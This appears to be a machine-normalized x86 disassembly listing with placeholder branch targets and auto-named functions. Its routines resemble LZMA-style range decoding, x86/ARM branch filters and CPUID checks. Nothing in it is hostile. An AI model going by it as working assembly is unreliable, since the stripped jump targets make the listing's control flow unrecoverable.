mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx ]
jbe r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov ecx [ eax ]
call ecx
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx + 0x1c ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_412c10
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
xor eax eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov [ ebp - 0x8 ] edx
mov esp ebp
pop ebp
retn
sub_406870
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0xc
mov esp ebp
pop ebp
retn
sub_4068b0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0x4 ] sub_406710
mov [ ebp - 0x4 ] sub_406660
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] sub_4067c0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] sub_4067e0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] sub_406870
mov esp ebp
pop ebp
retn
sub_406920
push ebp
mov ebp esp
sub esp 0x24c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x224 ] 0x0
mov [ ebp - 0x210 ] 0x0
mov [ ebp - 0x209 ] 0x0
mov [ ebp - 0x240 ] 0x0
jmp r-xdata
cmp [ ebp - 0x240 ] 0x102
jae r-xdata
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x218 ] eax
mov ecx [ ebp - 0x218 ]
add ecx [ ebp + 0x24 ]
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x220 ] 0x0
mov [ ebp - 0x21c ] 0xffffffff
mov [ ebp - 0x248 ] 0x0
jmp r-xdata
mov ecx 0x400
mov edx [ ebp - 0x240 ]
mov [ ebp + edx * 2 - 0x208 ] cx
jmp r-xdata
cmp [ ebp - 0x248 ] 0x5
jge r-xdata
mov eax [ ebp - 0x240 ]
add eax 0x1
mov [ ebp - 0x240 ] eax
cmp [ ebp + 0x2c ] 0x0
jne r-xdata
mov eax [ ebp - 0x218 ]
cmp eax [ ebp - 0x244 ]
jne r-xdata
mov edx [ ebp + 0xc ]
sub edx [ ebp - 0x224 ]
mov [ ebp - 0x228 ] edx
mov eax [ ebp + 0x2c ]
sub eax [ ebp - 0x210 ]
cmp eax [ ebp - 0x228 ]
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x220 ]
shl ecx 0x8
mov edx [ ebp - 0x218 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x220 ] ecx
mov ecx [ ebp - 0x218 ]
add ecx 0x1
mov [ ebp - 0x218 ] ecx
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x228 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
sub ecx [ ebp - 0x210 ]
mov [ ebp - 0x228 ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x248 ]
add edx 0x1
mov [ ebp - 0x248 ] edx
cmp [ ebp - 0x228 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x224 ]
mov al [ edx ]
mov [ ebp - 0x212 ] al
mov ecx [ ebp + 0x28 ]
add ecx [ ebp - 0x210 ]
mov dl [ ebp - 0x212 ]
mov [ ecx ] dl
mov eax [ ebp - 0x210 ]
add eax 0x1
mov [ ebp - 0x210 ] eax
movzx ecx [ ebp - 0x212 ]
and ecx 0xfe
cmp ecx 0xe8
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x210 ]
cmp ecx [ ebp + 0x2c ]
jne r-xdata
jmp r-xdata
movzx edx [ ebp - 0x209 ]
cmp edx 0xf
jne r-xdata
mov ecx [ ebp - 0x210 ]
cmp ecx [ ebp + 0x2c ]
jne r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x224 ]
mov al [ edx ]
mov [ ebp - 0x211 ] al
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
movzx edx [ ebp - 0x211 ]
cmp edx 0xe8
jne r-xdata
mov ecx [ ebp - 0x224 ]
add ecx 0x1
mov [ ebp - 0x224 ] ecx
mov dl [ ebp - 0x212 ]
mov [ ebp - 0x209 ] dl
mov eax [ ebp - 0x228 ]
sub eax 0x1
mov [ ebp - 0x228 ] eax
jmp r-xdata
movzx eax [ ebp - 0x212 ]
and eax 0xf0
cmp eax 0x80
jne r-xdata
mov [ ebp - 0x24c ] 0x1
mov [ ebp - 0x24c ] 0x0
jmp r-xdata
movzx edx [ ebp - 0x211 ]
cmp edx 0xe9
jne r-xdata
movzx eax [ ebp - 0x209 ]
lea ecx [ ebp + eax * 2 - 0x208 ]
mov [ ebp - 0x230 ] ecx
jmp r-xdata
mov eax [ ebp - 0x24c ]
lea ecx [ ebp - 0x6 ]
mov [ ebp - 0x230 ] ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x230 ] eax
jmp r-xdata
mov edx [ ebp - 0x230 ]
movzx eax [ edx ]
mov [ ebp - 0x22c ] eax
mov ecx [ ebp - 0x21c ]
shr ecx 0xb
imul ecx [ ebp - 0x22c ]
mov [ ebp - 0x23c ] ecx
mov edx [ ebp - 0x220 ]
cmp edx [ ebp - 0x23c ]
jae r-xdata
mov ecx [ ebp - 0x21c ]
sub ecx [ ebp - 0x23c ]
mov [ ebp - 0x21c ] ecx
mov edx [ ebp - 0x220 ]
sub edx [ ebp - 0x23c ]
mov [ ebp - 0x220 ] edx
mov eax [ ebp - 0x22c ]
shr eax 0x5
mov ecx [ ebp - 0x22c ]
sub ecx eax
mov edx [ ebp - 0x230 ]
mov [ edx ] cx
cmp [ ebp - 0x21c ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x23c ]
mov [ ebp - 0x21c ] eax
mov ecx 0x800
sub ecx [ ebp - 0x22c ]
shr ecx 0x5
add ecx [ ebp - 0x22c ]
mov edx [ ebp - 0x230 ]
mov [ edx ] cx
cmp [ ebp - 0x21c ] 0x1000000
jae r-xdata
movzx eax [ ebp - 0x211 ]
cmp eax 0xe8
jne r-xdata
mov eax [ ebp - 0x218 ]
cmp eax [ ebp - 0x244 ]
jne r-xdata
mov al [ ebp - 0x211 ]
mov [ ebp - 0x209 ] al
jmp r-xdata
mov eax [ ebp - 0x218 ]
cmp eax [ ebp - 0x244 ]
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x234 ] ecx
cmp [ ebp + 0x1c ] 0x4
jae r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x234 ] ecx
cmp [ ebp + 0x14 ] 0x4
jae r-xdata
mov ecx [ ebp - 0x21c ]
shl ecx 0x8
mov [ ebp - 0x21c ] ecx
mov edx [ ebp - 0x220 ]
shl edx 0x8
mov eax [ ebp - 0x218 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x21c ]
shl ecx 0x8
mov [ ebp - 0x21c ] ecx
mov edx [ ebp - 0x220 ]
shl edx 0x8
mov eax [ ebp - 0x218 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x220 ] edx
mov edx [ ebp - 0x218 ]
add edx 0x1
mov [ ebp - 0x218 ] edx
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
add edx 0x4
mov [ ebp + 0x18 ] edx
mov eax [ ebp + 0x1c ]
sub eax 0x4
mov [ ebp + 0x1c ] eax
mov eax 0x1
jmp r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x4
mov [ ebp + 0x10 ] edx
mov eax [ ebp + 0x14 ]
sub eax 0x4
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x238 ]
shr ecx 0x8
mov edx [ ebp + 0x28 ]
add edx [ ebp - 0x210 ]
mov [ edx ] cl
mov eax [ ebp - 0x210 ]
add eax 0x1
mov [ ebp - 0x210 ] eax
mov ecx [ ebp - 0x210 ]
cmp ecx [ ebp + 0x2c ]
jne r-xdata
jmp r-xdata
mov ecx 0x1
imul ecx ecx 0x0
mov edx [ ebp - 0x234 ]
movzx eax [ edx + ecx ]
shl eax 0x18
mov ecx 0x1
shl ecx 0x0
mov edx [ ebp - 0x234 ]
movzx ecx [ edx + ecx ]
shl ecx 0x10
or eax ecx
mov edx 0x1
shl edx 0x1
mov ecx [ ebp - 0x234 ]
movzx edx [ ecx + edx ]
shl edx 0x8
or eax edx
mov ecx 0x1
imul ecx ecx 0x3
mov edx [ ebp - 0x234 ]
movzx ecx [ edx + ecx ]
or eax ecx
mov edx [ ebp - 0x210 ]
add edx 0x4
sub eax edx
mov [ ebp - 0x238 ] eax
mov eax [ ebp + 0x28 ]
add eax [ ebp - 0x210 ]
mov cl [ ebp - 0x238 ]
mov [ eax ] cl
mov edx [ ebp - 0x210 ]
add edx 0x1
mov [ ebp - 0x210 ] edx
mov eax [ ebp - 0x210 ]
cmp eax [ ebp + 0x2c ]
jne r-xdata
mov edx [ ebp - 0x238 ]
shr edx 0x10
mov eax [ ebp + 0x28 ]
add eax [ ebp - 0x210 ]
mov [ eax ] dl
mov ecx [ ebp - 0x210 ]
add ecx 0x1
mov [ ebp - 0x210 ] ecx
mov edx [ ebp - 0x210 ]
cmp edx [ ebp + 0x2c ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x238 ]
shr eax 0x18
mov [ ebp - 0x209 ] al
mov ecx [ ebp + 0x28 ]
add ecx [ ebp - 0x210 ]
mov dl [ ebp - 0x209 ]
mov [ ecx ] dl
mov eax [ ebp - 0x210 ]
add eax 0x1
mov [ ebp - 0x210 ] eax
jmp r-xdata
sub_406eb0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0xc ] 0x4
jae r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
add ecx 0x8
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x3 ]
cmp edx 0xeb
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
shl ecx 0x10
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x1 ]
shl eax 0x8
or ecx eax
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0xc ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x4
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
shr edx 0x2
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x10
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx + 0x2 ] al
mov edx [ ebp - 0x8 ]
shr edx 0x8
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] dl
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x8 ]
mov [ ecx ] dl
sub_406fa0
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
and ecx 0x7
mov [ ebp - 0x10 ] ecx
cmp [ ebp + 0xc ] 0x5
jae r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x5
mov [ ebp + 0x10 ] edx
mov [ ebp - 0x14 ] 0xffffffff
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
sub edx [ ebp + 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x8 ]
movzx ecx [ eax ]
and ecx 0xfe
cmp ecx 0xe8
jne r-xdata
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x14 ] 0x3
jbe r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov edx [ ebp - 0x10 ]
shl edx cl
and edx 0x7
mov [ ebp - 0x10 ] edx
je r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x3
jbe r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
movzx eax [ edx + ecx ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
movzx ecx [ eax + r--data ]
mov edx 0x4
sub edx ecx
mov eax [ ebp - 0x8 ]
mov cl [ eax + edx ]
mov [ ebp - 0x1 ] cl
mov edx [ ebp - 0x10 ]
movzx eax [ edx + r--data ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
sub ecx 0x1
mov edx [ ebp - 0x10 ]
shl edx cl
and edx 0x7
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
movzx eax [ edx + ecx ]
shl eax 0x18
mov ecx 0x1
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
movzx ecx [ edx + ecx ]
shl ecx 0x10
or eax ecx
mov edx 0x1
shl edx 0x1
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + edx ]
shl edx 0x8
or eax edx
mov ecx 0x1
shl ecx 0x0
mov edx [ ebp - 0x8 ]
movzx ecx [ edx + ecx ]
or eax ecx
mov [ ebp - 0x1c ] eax
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
movzx eax [ edx + ecx ]
cmp eax 0xff
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
shl ecx 0x1
and ecx 0x7
or ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
movzx ecx [ ebp - 0x1 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov eax [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x1c ]
sub ecx eax
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp - 0xc ]
add edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
shl ecx 0x1
and ecx 0x7
or ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx - 0x4 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx 0xff
jne r-xdata
mov edx [ ebp - 0x10 ]
movzx eax [ edx + r--data ]
shl eax 0x3
mov [ ebp - 0x24 ] eax
mov ecx 0x18
sub ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
shr edx cl
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x2 ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx 0x20
sub ecx [ ebp - 0x24 ]
mov edx 0x1
shl edx cl
sub edx 0x1
xor edx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
movzx ecx [ ebp - 0x2 ]
cmp ecx 0xff
je r-xdata
mov eax [ ebp - 0x18 ]
shr eax 0x18
and eax 0x1
sub eax 0x1
not eax
mov ecx 0x1
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov [ edx + ecx ] al
mov eax [ ebp - 0x18 ]
shr eax 0x10
mov ecx 0x1
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
mov [ edx + ecx ] al
mov eax [ ebp - 0x18 ]
shr eax 0x8
mov ecx 0x1
shl ecx 0x1
mov edx [ ebp - 0x8 ]
mov [ edx + ecx ] al
mov eax 0x1
shl eax 0x0
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x18 ]
mov [ ecx + eax ] dl
mov eax [ ebp - 0xc ]
add eax 0x5
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
sub_407270
push ebp
mov ebp esp
pushfd
pop eax
mov edx eax
xor eax [ ebp + 0x8 ]
push eax
popfd
pushfd
pop eax
xor eax edx
push edx
popfd
and [ ebp + 0x8 ] eax
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_407290
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
xor ecx ecx
xor edx edx
mov eax [ ebp + 0x8 ]
cpuid
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ edx ] eax
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_4072f0
push ebp
mov ebp esp
push 0x40000
call sub_407270
add esp 0x4
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x200000
call sub_407270
add esp 0x4
test eax eax
jne r-xdata
pop ebp
retn
mov eax 0x4
shl eax 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x4 ]
push edx
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x4 ]
push edx
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
call sub_407290
add esp 0x14
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x18
push edx
mov eax [ ebp + 0x8 ]
add eax 0x14
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x10
push ecx
push 0x1
call sub_407290
add esp 0x14
mov eax 0x1
sub_407390
push ebp
mov ebp esp
sub esp 0x8
push esi
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jae r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0xc
add ecx rw-data
mov [ ebp - 0x8 ] ecx
mov edx 0x4
imul edx edx 0x0
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov edx [ ecx + edx ]
cmp edx [ esi + eax + 0x4 ]
jne r-xdata
jmp r-xdata
mov eax 0x4
shl eax 0x0
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax [ edx + eax ]
cmp eax [ esi + ecx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx 0x4
shl ecx 0x1
mov edx 0x4
shl edx 0x1
mov eax [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ eax + ecx ]
cmp ecx [ esi + edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_407430
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_4072f0
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
shr ecx 0x8
and ecx 0xff00f
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x14 ]
shr edx 0x4
and edx 0xf00f
mov [ ebp - 0x2c ] edx
lea eax [ ebp - 0x24 ]
push eax
call sub_407390
add esp 0x4
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x40 ]
mov [ ebp - 0x30 ] ecx
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x6
jb r-xdata
cmp [ ebp - 0x30 ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov [ ebp - 0x34 ] 0x1
cmp [ ebp - 0x28 ] 0x6
jne r-xdata
cmp [ ebp - 0x28 ] 0x5
jb r-xdata
cmp [ ebp - 0x30 ] 0x2
je r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0x100c
je r-xdata
mov [ ebp - 0x38 ] 0x1
cmp [ ebp - 0x28 ] 0x5
jne r-xdata
cmp [ ebp - 0x28 ] 0x6
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x34 ]
jmp r-xdata
mov [ ebp - 0x38 ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0x6
jb r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x28 ] 0x6
jne r-xdata
mov eax 0x1
mov eax [ ebp - 0x38 ]
jmp r-xdata
cmp [ ebp - 0x2c ] 0xa
je r-xdata
mov [ ebp - 0x3c ] 0x0
jmp r-xdata
cmp [ ebp - 0x2c ] 0xf
jb r-xdata
mov eax [ ebp - 0x3c ]
jmp r-xdata
sub_407540
push ebp
mov ebp esp
sub esp 0x8
push esi
movzx eax [ ebp + 0x8 ]
cmp eax 0x28
jle r-xdata
movzx ecx [ ebp + 0x8 ]
cmp ecx 0x28
jne r-xdata
mov eax 0x4
jmp r-xdata
movzx esi [ ebp + 0x8 ]
and esi 0x1
or esi 0x2
movzx eax [ ebp + 0x8 ]
cdq
sub eax edx
sar eax 0x1
add eax 0xb
mov ecx eax
shl esi cl
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
mov eax 0x1
imul eax eax 0x0
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] 0x4
mov edx 0x1
shl edx 0x0
mov eax [ ebp + 0xc ]
mov cl [ ebp - 0x4 ]
mov [ eax + edx ] cl
mov edx [ ebp - 0x4 ]
shr edx 0x8
mov eax 0x1
shl eax 0x1
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] dl
mov edx [ ebp - 0x4 ]
shr edx 0x10
mov eax 0x1
imul eax eax 0x3
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] dl
mov edx [ ebp - 0x4 ]
shr edx 0x18
mov eax 0x1
shl eax 0x2
mov ecx [ ebp + 0xc ]
mov [ ecx + eax ] dl
xor eax eax
sub_407600
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
movzx ecx [ ebp + 0xc ]
push ecx
call sub_407540
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
push 0x5
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a7d0
add esp 0x10
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_407660
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x78 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x80 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x84 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x88 ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a180
add esp 0x4
pop ebp
retn
sub_4076b0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x78 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x5
ja r-xdata
mov eax 0x9
mov edx [ ebp - 0x4 ]
jmp [ edx * 4 + jump_table_4078b4 ]
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0xc ]
mov [ eax + 0x7c ] cl
mov edx [ ebp + 0x8 ]
movzx eax [ edx + 0x7c ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0xc ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
or eax [ ecx + 0x74 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] eax
mov eax 0x2
jmp r-xdata
movzx eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
or eax [ ecx + 0x74 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x74 ] ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x7c ]
and ecx 0x80
jne r-xdata
movzx edx [ ebp + 0xc ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] edx
mov eax 0x4
jmp r-xdata
movzx ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
or ecx [ edx + 0x70 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x70 ] edx
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
sar edx 0x5
and edx 0x3
cmp edx 0x2
jl r-xdata
movzx edx [ ebp + 0xc ]
cmp edx 0xe1
jl r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x7c ]
and edx 0x80
jne r-xdata
mov eax 0x8
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x3
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x5
jmp r-xdata
movzx eax [ ebp + 0xc ]
cdq
mov ecx 0x9
idiv ecx
mov [ ebp - 0x14 ] edx
movzx eax [ ebp + 0xc ]
cdq
mov ecx 0x9
idiv ecx
mov [ ebp + 0xc ] al
movzx eax [ ebp + 0xc ]
